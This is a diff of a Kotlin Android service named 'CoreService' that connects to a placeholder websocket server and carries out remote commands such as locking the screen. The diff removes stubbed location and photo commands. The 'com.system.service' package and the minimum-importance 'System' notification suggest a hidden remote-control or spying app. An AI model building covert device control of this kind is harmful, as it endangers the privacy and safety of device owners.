@@ -4,14 +4,12 @@ import android.app.*
 import android.content.Intent
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
-import com.system.service.R
 import org.json.JSONObject
 
 class CoreService : Service() {
 
     companion object {
-        lateinit var instance: CoreService
-        // Apna server URL yahan daalo
+        var instance: CoreService? = null
         const val SERVER_URL = "wss://YOUR_CLOUDFLARE_URL"
     }
 
@@ -23,6 +21,11 @@ class CoreService : Service() {
         createNotificationChannel()
         startForeground(1, buildNotification())
         connectServer()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        instance = null
     }
 
     private fun connectServer() {
@@ -38,8 +41,6 @@ class CoreService : Service() {
     private fun handleCommand(data: JSONObject) {
         when (data.optString("command")) {
             "lock_screen" -> lockScreen()
-            "get_location" -> sendLocation()
-            "take_photo" -> takePhoto()
             "get_battery" -> sendBattery()
         }
     }
@@ -51,21 +52,13 @@ class CoreService : Service() {
     }
 
     private fun lockScreen() {
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) 
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE)
             as android.app.admin.DevicePolicyManager
         dpm.lockNow()
     }
 
-    private fun sendLocation() {
-        // LocationMonitor se location leke bhejte hain
-    }
-
-    private fun takePhoto() {
-        // CameraMonitor se photo leke bhejte hain
-    }
-
     private fun sendBattery() {
-        val bm = getSystemService(BATTERY_SERVICE) 
+        val bm = getSystemService(BATTERY_SERVICE)
             as android.os.BatteryManager
         val level = bm.getIntProperty(
             android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
@@ -76,7 +69,7 @@ class CoreService : Service() {
 
     private fun createNotificationChannel() {
         val channel = NotificationChannel(
-            "main", "System", 
+            "main", "System",
             NotificationManager.IMPORTANCE_MIN)
         getSystemService(NotificationManager::class.java)
             .createNotificationChannel(channel)
